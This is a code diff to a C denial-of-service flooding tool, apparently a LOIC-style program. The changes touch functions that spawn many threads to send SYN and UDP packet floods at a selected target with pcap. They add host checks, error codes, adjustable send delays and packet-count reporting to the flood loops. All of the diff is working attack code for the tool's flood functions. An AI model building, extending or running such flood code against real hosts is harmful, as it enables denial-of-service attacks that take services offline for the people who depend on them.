@@ -19,6 +19,8 @@ int auto_detect_custom_device() {
 
 int charge_superCanon() {
 
+    p_BOOL quick = TRUE;
+
     int nb_dev = c_devices_count();
     int nb_tested_dev = 0;
     printf("%d devices found !\n",nb_dev);
@@ -30,7 +32,7 @@ int charge_superCanon() {
 
     char* dst = ip2string( randIP(0) );
 
-    int port = p_random(100,13370);
+    int port = p_random( 100, 13370 );
 
     int i;
     for (i=1; i <= nb_dev; i++) {
@@ -84,6 +86,13 @@ int charge_superCanon() {
 
         m_return_codes[i-1] = (int) rett;
 
+        if ( quick == TRUE && m_return_codes[i-1] == 0) {
+            i++;
+            for ( ; i <= nb_tested_dev; i++) {
+                pthread_cancel(threads_listen[i-1]);
+            }
+        }
+
 
     }
 
@@ -126,14 +135,14 @@ int superFire(int id) {
                 return syn_superFire(id);
             }
             else
-                loic_error("Network is not configured.", CONSOLE);
+                loic_error("Network is not configured.", GRAVE);
             break;
         case SUDP:
             if ( isNetworkReady() == TRUE ) {
                 return udp_superFire(id);
             }
             else
-                loic_error("Network is not configured.", CONSOLE);
+                loic_error("Network is not configured.", GRAVE);
             break;
         default:
             return tcp_fire(id);
@@ -150,43 +159,48 @@ int start_superCanon() {
 
         if ( strcmp(getTarget(),"") != 0 ) {
 
-            printf("Canon charged !\n");
+            if ( isHostname( getTarget() )) {
 
-            int i;
-            for ( i=0; i < getNbThreads(); i++ ) {
-                pthread_create(&threads[i],NULL,(void*)superFire,(void*)i);
+                printf("Canon charged !\n");
+
+                int i;
+                for ( i=0; i < getNbThreads(); i++ ) {
+                    pthread_create(&threads[i],NULL,(void*)superFire,(void*)i);
+                }
+
+                /* If one or several threads running */
+                if (i > 0)
+                    setStatus(FIRING);
+
+                pthread_t thread_timeout;
+                pthread_create(&thread_timeout,NULL,(void*)oversee_timeout,(void*)getTimeout());
+
+                int total_packets_sent = 0;
+
+                for ( i=0; i < getNbThreads(); i++ ) {
+                    int packets_sent = 0;
+                    pthread_join(threads[i],(void*)&packets_sent);
+                    printf("Canon %d |--> %d packets sent\n",i,packets_sent);
+                    total_packets_sent += packets_sent;
+                }
+
+
+                setStatus(READY);
+                printf("%d packets sent !\n",total_packets_sent);
+
+                return 0;
             }
-
-            /* If one or several threads running */
-            if (i > 0)
-                setStatus(FIRING);
-
-            pthread_t thread_timeout;
-            pthread_create(&thread_timeout,NULL,(void*)oversee_timeout,(void*)getTimeout());
-
-            int total_packets_sent = 0;
-
-            for ( i=0; i < getNbThreads(); i++ ) {
-                int packets_sent = 0;
-                pthread_join(threads[i],(void*)&packets_sent);
-                printf("Canon %d |--> %d packets sent\n",i,packets_sent);
-                total_packets_sent += packets_sent;
-            }
-
-
-            setStatus(READY);
-            printf("%d packets sent !\n",total_packets_sent);
-
-            return 0;
+            else
+                return E_UNKNOWN_HOST;
 
         }
         else
-            loic_error("You have not selected a target", CONSOLE);
+            return E_NO_HOST;
     }
     else
-        loic_error("Not ready", CONSOLE);
+       return E_BUSY;
 
-    return 2;
+    return -1;
 }
 
 int syn_superFire(int id) {
@@ -243,10 +257,14 @@ int syn_superFire(int id) {
         return -1;
     }
 
+    int j = 0;
     while ( getStatus() == FIRING && caplen > 0) {
+
+        int delay = speed2delay(getSpeed());
 
         /* Windows Only */
         #ifdef WIN32
+
 
 
             /* Allocate a send queue */
@@ -291,7 +309,10 @@ int syn_superFire(int id) {
             /* free the send queue */
             pcap_sendqueue_destroy(squeue);
 
-
+            j++;
+            if ( j % 1 == 0 ) {
+                setNbPacketsSent(id, npacks);
+            }
 
             /* No Windows */
 
@@ -300,7 +321,13 @@ int syn_superFire(int id) {
             pcap_sendpacket(outdesc, pkt_data, size);
             npacks++;
 
+            if ( npacks % 15 == 0 ) {
+                setNbPacketsSent(id, npacks);
+            }
+
         #endif
+
+            sleep_millis(delay);
     }
 
     printf("END FIRE (%d)\n",caplen);
@@ -368,7 +395,11 @@ int udp_superFire(int id) {
         return -1;
     }
 
+    int j=0;
     while ( getStatus() == FIRING && caplen > 0) {
+
+        int delay = speed2delay( getSpeed() );
+
 
         /* Windows Only */
         #ifdef WIN32
@@ -417,6 +448,10 @@ int udp_superFire(int id) {
             pcap_sendqueue_destroy(squeue);
 
 
+            j++;
+            if ( j % 1 == 0 ) {
+                setNbPacketsSent(id, npacks);
+            }
 
             /* No Windows */
 
@@ -425,7 +460,14 @@ int udp_superFire(int id) {
             pcap_sendpacket(outdesc, pkt_data, size);
             npacks++;
 
+            if ( npacks % 15 == 0 ) {
+                setNbPacketsSent(id, npacks);
+            }
+
+
         #endif
+            sleep_millis(delay);
+
 
     }
 
@@ -507,7 +549,10 @@ int test_superFire(int id) {
         return -1;
     }
 
-    while ( getStatus() == FIRING && caplen > 0) {
+    int j=0;
+    while ( getStatus() == FIRING && caplen > 0 ) {
+
+        int delay = speed2delay(getSpeed());
 
         /* Windows Only */
         #ifdef WIN32
@@ -556,6 +601,10 @@ int test_superFire(int id) {
             pcap_sendqueue_destroy(squeue);
 
 
+            j++;
+            if ( j % 1 == 0 ) {
+                setNbPacketsSent(id, npacks);
+            }
 
             /* No Windows */
 
@@ -564,7 +613,14 @@ int test_superFire(int id) {
             pcap_sendpacket(outdesc, pkt_data, size);
             npacks++;
 
+            if ( npacks % 15 == 0 ) {
+                setNbPacketsSent(id, npacks);
+            }
+
+
         #endif
+
+            sleep_millis(delay);
 
     }
 
